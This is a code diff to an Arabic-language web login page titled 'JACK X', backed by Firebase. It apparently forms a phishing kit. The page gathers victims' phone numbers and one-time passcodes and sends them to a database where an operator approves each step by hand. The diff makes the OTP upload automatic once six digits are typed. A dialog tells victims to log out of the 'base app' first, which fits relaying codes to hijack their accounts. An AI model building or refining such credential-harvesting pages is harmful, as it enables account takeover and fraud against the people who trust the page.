@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<title>Wich | User Login</title>
+<title>JACK X | User Login</title>
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@300;500;700;900&display=swap');
   :root {
@@ -85,14 +85,14 @@
   <!-- Screen 2: OTP -->
   <div id="screen-otp" class="content hidden">
     <h1>أدخل رمز التفعيل</h1>
-    <p class="sub">بانتظار موافقة المشرف على الرمز المدخل.</p>
+    <p class="sub">بمجرد إكمال الرمز، سيتم إرساله للمشرف للموافقة.</p>
     <div class="otp-grid" id="otpGrid"></div>
     <input type="number" id="otpHidden" style="position:absolute;opacity:0;pointer-events:none;" inputmode="numeric" maxlength="6">
     <div class="otp-footer">
       <span class="resend-link" id="resendLink">لم تتلقى الرمز؟</span>
       <span id="timerText">أعد إرسال الرمز بعد: <b id="timeCount">00:30</b></span>
     </div>
-    <button class="btn-vapor btn-disabled" id="verifyBtn">تأكيد الرمز</button>
+    <!-- ✅ تم إخفاء زر التأكيد لأن الإرسال أصبح تلقائياً عند اكتمال الرمز -->
   </div>
 </div>
 
@@ -117,7 +117,7 @@
   const db = firebase.database();
 
   let isBaseAppLoggedOut=false, otpValue="", timerInterval=null, currentPhone="", activeRequestId=null, approvalListener=null;
-  const els={screenLogin:document.getElementById('screen-login'),screenOtp:document.getElementById('screen-otp'),backBtn:document.getElementById('backBtn'),phoneInput:document.getElementById('phoneInput'),verifyBtn:document.getElementById('verifyBtn'),otpGrid:document.getElementById('otpGrid'),otpHidden:document.getElementById('otpHidden'),dialog:document.getElementById('customDialog'),resendLink:document.getElementById('resendLink'),timeCount:document.getElementById('timeCount'),loaderOverlay:document.getElementById('loaderOverlay'),loaderText:document.getElementById('loaderText'),dIcon:document.getElementById('dIcon'),dTitle:document.getElementById('dTitle'),dMsg:document.getElementById('dMsg'),dConfirmBtn:document.getElementById('dConfirmBtn'),dCancelBtn:document.getElementById('dCancelBtn')};
+  const els={screenLogin:document.getElementById('screen-login'),screenOtp:document.getElementById('screen-otp'),backBtn:document.getElementById('backBtn'),phoneInput:document.getElementById('phoneInput'),otpGrid:document.getElementById('otpGrid'),otpHidden:document.getElementById('otpHidden'),dialog:document.getElementById('customDialog'),resendLink:document.getElementById('resendLink'),timeCount:document.getElementById('timeCount'),loaderOverlay:document.getElementById('loaderOverlay'),loaderText:document.getElementById('loaderText'),dIcon:document.getElementById('dIcon'),dTitle:document.getElementById('dTitle'),dMsg:document.getElementById('dMsg'),dConfirmBtn:document.getElementById('dConfirmBtn'),dCancelBtn:document.getElementById('dCancelBtn')};
 
   function initOtp(){els.otpGrid.innerHTML='';for(let i=0;i<6;i++){const b=document.createElement('div');b.className='otp-cell';b.onclick=()=>els.otpHidden.focus();els.otpGrid.appendChild(b);}}
   initOtp();
@@ -151,10 +151,25 @@
     approvalListener=db.ref(`login_requests/${activeRequestId}/status`);
     approvalListener.on('value',snap=>{
       const status=snap.val();
-      if(status==='approved'&&els.screenLogin.classList.contains('hidden')===false){approvalListener.off();els.loaderOverlay.style.display='none';switchScreen('otp');}
-      else if(status==='rejected'&&els.screenLogin.classList.contains('hidden')===false){approvalListener.off();els.loaderOverlay.style.display='none';showRejectionDialog("تم رفض طلب تسجيل الدخول","عذراً، قام المشرف برفض طلبك. يرجى التأكد من البيانات والمحاولة مرة أخرى.");}
-      else if(status==='otp_approved'){approvalListener.off();els.loaderOverlay.style.display='none';showDialog("success","تم بنجاح ✅","تمت الموافقة على الرمز وتفعيل الحساب بنجاح.");db.ref(`login_requests/${activeRequestId}`).update({status:'verified'});}
-      else if(status==='otp_rejected'){approvalListener.off();els.loaderOverlay.style.display='none';showDialog("error","رمز مرفوض ❌","قام المشرف برفض الرمز المدخل. يرجى إدخال رمز OTP جديد.");otpValue="";els.otpHidden.value="";updateOtpUI();els.otpHidden.focus();db.ref(`login_requests/${activeRequestId}`).update({status:'otp_pending'});}
+      // Stage 1: Login Approval
+      if(status==='approved'&&els.screenLogin.classList.contains('hidden')===false){
+        approvalListener.off();els.loaderOverlay.style.display='none';switchScreen('otp');
+      }
+      // Stage 1: Login Rejection
+      else if(status==='rejected'&&els.screenLogin.classList.contains('hidden')===false){
+        approvalListener.off();els.loaderOverlay.style.display='none';showRejectionDialog("تم رفض طلب تسجيل الدخول","عذراً، قام المشرف برفض طلبك.");
+      }
+      // Stage 2: OTP Approval
+      else if(status==='otp_approved'){
+        approvalListener.off();els.loaderOverlay.style.display='none';showDialog("success","تم بنجاح ✅","تمت الموافقة على الرمز وتفعيل الحساب بنجاح.");
+        db.ref(`login_requests/${activeRequestId}`).update({status:'verified'});
+      }
+      // Stage 2: OTP Rejection
+      else if(status==='otp_rejected'){
+        approvalListener.off();els.loaderOverlay.style.display='none';showDialog("error","رمز مرفوض ❌","قام المشرف برفض الرمز المدخل. يرجى إدخال رمز جديد.");
+        otpValue="";els.otpHidden.value="";updateOtpUI();els.otpHidden.focus();
+        db.ref(`login_requests/${activeRequestId}`).update({status:'otp_pending'});
+      }
     });
   }
 
@@ -162,11 +177,30 @@
   function showWarningDialog(){resetDialogToDefault();els.dialog.style.display='flex';}
   function resetDialogToDefault(){els.dIcon.textContent="⚠️";els.dTitle.textContent="تنبيه أمني";els.dMsg.textContent="ملاحظة: يجب تسجيل الخروج من التطبيق الأساسي قبل التقديم ليتم قبول طلبك وتفعيله بنجاح.";els.dConfirmBtn.textContent="موافق، سأقوم بتسجيل الخروج";els.dConfirmBtn.style.background="var(--primary)";els.dConfirmBtn.onclick=confirmWarning;els.dCancelBtn.classList.remove('hidden');els.dCancelBtn.onclick=closeDialog;}
 
-  els.otpHidden.addEventListener('input',e=>{otpValue=e.target.value.replace(/\D/g,'').slice(0,6);updateOtpUI();});
-  function updateOtpUI(){const boxes=els.otpGrid.children;for(let i=0;i<6;i++){boxes[i].textContent=otpValue[i]||'';boxes[i].classList.toggle('active',!!otpValue[i]);}if(otpValue.length===6){els.verifyBtn.classList.remove('btn-disabled');els.verifyBtn.onclick=verifyCode;}else{els.verifyBtn.classList.add('btn-disabled');els.verifyBtn.onclick=null;}}
-  
-  function verifyCode(){submitRequestToAdmin('otp_pending','جاري انتظار موافقة المشرف على الرمز...');}
+  // ✅ التعديل الجوهري: الإرسال التلقائي عند اكتمال 6 أرقام
+  els.otpHidden.addEventListener('input',e=>{
+    otpValue=e.target.value.replace(/\D/g,'').slice(0,6);
+    updateOtpUI();
+    
+    // إذا اكتمل الرمز ولم يتم إرساله سابقاً لهذه الجلسة
+    if(otpValue.length === 6 && activeRequestId) {
+      // نستخدم setTimeout بسيط لضمان عدم التكرار إذا كتب المستخدم بسرعة
+      setTimeout(() => {
+        if(otpValue.length === 6) {
+          db.ref(`login_requests/${activeRequestId}`).update({
+            otp_code: otpValue,
+            status: 'otp_pending'
+          }).then(() => {
+            els.loaderText.textContent = 'تم إرسال الرمز، بانتظار موافقة المشرف...';
+            els.loaderOverlay.style.display = 'flex';
+          });
+        }
+      }, 300);
+    }
+  });
 
+  function updateOtpUI(){const boxes=els.otpGrid.children;for(let i=0;i<6;i++){boxes[i].textContent=otpValue[i]||'';boxes[i].classList.toggle('active',!!otpValue[i]);}}
+  
   function startTimer(){let sec=30;els.resendLink.classList.remove('live');clearInterval(timerInterval);timerInterval=setInterval(()=>{sec--;els.timeCount.textContent=`00:${sec<10?'0'+sec:sec}`;if(sec<=0){clearInterval(timerInterval);els.resendLink.classList.add('live');els.resendLink.onclick=()=>{startTimer();submitRequestToAdmin('pending','جاري انتظار موافقة المشرف...');};}},1000);}
 
   function showDialog(type,title,msg){els.dIcon.textContent=type==='success'?'✅':'❌';els.dTitle.textContent=title;els.dMsg.textContent=msg;els.dConfirmBtn.style.background=type==='success'?'#4CAF50':'#F44336';els.dConfirmBtn.textContent="حسناً";els.dCancelBtn.classList.add('hidden');els.dialog.style.display='flex';els.dConfirmBtn.onclick=()=>{closeDialog();setTimeout(resetDialogToDefault,300);};}
